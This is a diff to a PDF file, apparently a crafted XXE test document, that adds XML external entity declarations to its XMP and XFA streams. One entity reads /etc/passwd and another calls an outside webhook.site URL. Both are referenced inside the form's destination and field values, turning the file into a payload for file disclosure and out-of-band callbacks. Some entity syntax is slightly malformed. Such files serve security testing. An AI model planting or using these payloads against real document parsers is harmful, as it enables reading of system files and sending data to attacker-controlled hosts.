@@ -74,7 +74,7 @@ endobj
 >>
 stream
 <?xpacket begin="﻿" id="W5M0MpCehiHzreSzNTczkc9d"?>
-<!DOCTYPE foo [ <!ENTITY xxe2 SYSTEM "file:///etc/passwd" > ]>
+<!DOCTYPE foo [ <!ENTITY xxe2 SYSTEM "https://webhook.site/39a19d2a-d102-4cd4-8d37-1137126df3b5" > ]>
 <x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 4.0-c321 44.398116, Tue Aug 04 2009 14:24:39">
    <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
       <rdf:Description rdf:about=""
@@ -740,6 +740,7 @@ endobj
 >>
 stream
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://etc/passwd" > ]>
 <xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
 endstream
 endobj
@@ -759,7 +760,7 @@ stream
 <config xmlns="http://www.xfa.org/schema/xci/1.0/"
 ><agent name="designer"
 ><destination
->pdf</destination
+>pdf &xxe;</destination
 ><pdf
 ><!--  [0..n]  --><fontInfo
 ></fontInfo
@@ -1843,7 +1844,7 @@ X/fS/djxlaDvqdr/AL6X7seMrQcLO1HSJfux4ytBr6jaHrCv3Y8Z71oN/UrT/fK/djxnvWg19Rs/
 ><value
 ><text
 >City:</text
-></value
+>&xxe2</value
 ><font size="12pt" typeface="Times New Roman"
 ></font
 ><para vAlign="bottom"
@@ -9570,7 +9571,7 @@ P
 
 
 					
-    															
+    															
 					
                 	
 
